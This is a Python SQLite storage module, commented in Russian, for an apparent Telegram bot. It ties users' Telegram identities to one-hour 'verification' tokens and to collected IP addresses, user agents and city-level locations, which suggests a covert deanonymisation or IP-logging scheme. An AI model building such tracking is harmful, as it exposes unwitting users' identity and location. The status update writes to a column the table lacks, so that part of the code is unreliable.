"""
Модуль работы с базой данных
Использует SQLite для хранения данных
"""

import sqlite3
import json
from datetime import datetime
from typing import Optional, Dict, Any
import logging

logger = logging.getLogger(__name__)

class DatabaseManager:
    def __init__(self, db_path: str):
        self.db_path = db_path
        self.connection = None
        
    def connect(self):
        """Установка соединения с базой данных"""
        try:
            self.connection = sqlite3.connect(self.db_path)
            self.connection.row_factory = sqlite3.Row
            logger.info(f"Подключено к базе данных: {self.db_path}")
            return True
        except Exception as e:
            logger.error(f"Ошибка подключения к БД: {e}")
            return False
    
    def disconnect(self):
        """Закрытие соединения с базой данных"""
        if self.connection:
            self.connection.close()
            logger.info("Соединение с БД закрыто")
    
    def init_tables(self):
        """Инициализация таблиц базы данных"""
        try:
            cursor = self.connection.cursor()
            
            # Таблица пользователей
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS users (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    telegram_id INTEGER UNIQUE,
                    username TEXT,
                    first_name TEXT,
                    last_name TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            # Таблица токенов верификации
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS verification_tokens (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    token TEXT UNIQUE,
                    status TEXT DEFAULT 'pending',
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    expires_at TIMESTAMP,
                    FOREIGN KEY (user_id) REFERENCES users (id)
                )
            ''')
            
            # Таблица собранных данных
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS collected_data (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    token TEXT,
                    data_json TEXT,
                    ip_address TEXT,
                    user_agent TEXT,
                    country TEXT,
                    city TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (token) REFERENCES verification_tokens (token)
                )
            ''')
            
            # Индексы для ускорения поиска
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_tokens ON verification_tokens(token)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_users_telegram ON users(telegram_id)')
            
            self.connection.commit()
            logger.info("Таблицы базы данных инициализированы")
            return True
            
        except Exception as e:
            logger.error(f"Ошибка инициализации таблиц: {e}")
            return False
    
    def save_verification_token(self, user_data: Dict[str, Any]) -> Optional[str]:
        """Сохранение токена верификации в БД"""
        try:
            cursor = self.connection.cursor()
            
            # Проверка существования пользователя
            cursor.execute(
                'SELECT id FROM users WHERE telegram_id = ?',
                (user_data['telegram_id'],)
            )
            user_row = cursor.fetchone()
            
            if user_row:
                user_id = user_row['id']
            else:
                # Создание нового пользователя
                cursor.execute('''
                    INSERT INTO users (telegram_id, username, first_name, last_name)
                    VALUES (?, ?, ?, ?)
                ''', (
                    user_data['telegram_id'],
                    user_data['username'],
                    user_data['first_name'],
                    user_data['last_name']
                ))
                user_id = cursor.lastrowid
            
            # Сохранение токена
            cursor.execute('''
                INSERT INTO verification_tokens (user_id, token, expires_at)
                VALUES (?, ?, datetime('now', '+1 hour'))
            ''', (user_id, user_data['token']))
            
            self.connection.commit()
            logger.info(f"Токен сохранен для пользователя {user_data['telegram_id']}")
            return user_data['token']
            
        except Exception as e:
            logger.error(f"Ошибка сохранения токена: {e}")
            return None
    
    def get_user_by_token(self, token: str) -> Optional[Dict[str, Any]]:
        """Получение данных пользователя по токену"""
        try:
            cursor = self.connection.cursor()
            
            cursor.execute('''
                SELECT u.*, vt.token, vt.status 
                FROM users u
                JOIN verification_tokens vt ON u.id = vt.user_id
                WHERE vt.token = ? AND vt.expires_at > datetime('now')
            ''', (token,))
            
            row = cursor.fetchone()
            if row:
                return dict(row)
            return None
            
        except Exception as e:
            logger.error(f"Ошибка получения пользователя по токену: {e}")
            return None
    
    def save_collected_data(self, token: str, collected_data: Dict[str, Any]) -> bool:
        """Сохранение собранных данных в БД"""
        try:
            cursor = self.connection.cursor()
            
            # Получение ID токена
            cursor.execute(
                'SELECT id FROM verification_tokens WHERE token = ?',
                (token,)
            )
            token_row = cursor.fetchone()
            
            if not token_row:
                return False
            
            # Сохранение данных
            cursor.execute('''
                INSERT INTO collected_data (
                    token, data_json, ip_address, user_agent, country, city
                ) VALUES (?, ?, ?, ?, ?, ?)
            ''', (
                token,
                json.dumps(collected_data, ensure_ascii=False),
                collected_data.get('ip'),
                collected_data.get('user_agent'),
                collected_data.get('geo', {}).get('country'),
                collected_data.get('geo', {}).get('city')
            ))
            
            # Обновление статуса токена
            cursor.execute('''
                UPDATE verification_tokens 
                SET status = 'completed', updated_at = CURRENT_TIMESTAMP
                WHERE token = ?
            ''', (token,))
            
            self.connection.commit()
            logger.info(f"Данные сохранены для токена {token}")
            return True
            
        except Exception as e:
            logger.error(f"Ошибка сохранения данных: {e}")
            return False

# Глобальный экземпляр менеджера БД
db_manager = None

def init_database(db_path: str = None):
    """Инициализация базы данных"""
    global db_manager
    
    from config import DATABASE_PATH
    db_path = db_path or DATABASE_PATH
    
    db_manager = DatabaseManager(db_path)
    if db_manager.connect():
        db_manager.init_tables()
        return db_manager
    return None

# Функции для удобного использования
def save_verification_token(user_data: dict):
    if db_manager:
        return db_manager.save_verification_token(user_data)

def get_user_by_token(token: str):
    if db_manager:
        return db_manager.get_user_by_token(token)

def save_collected_data(token: str, collected_data: dict):
    if db_manager:
        return db_manager.save_collected_data(token, collected_data)
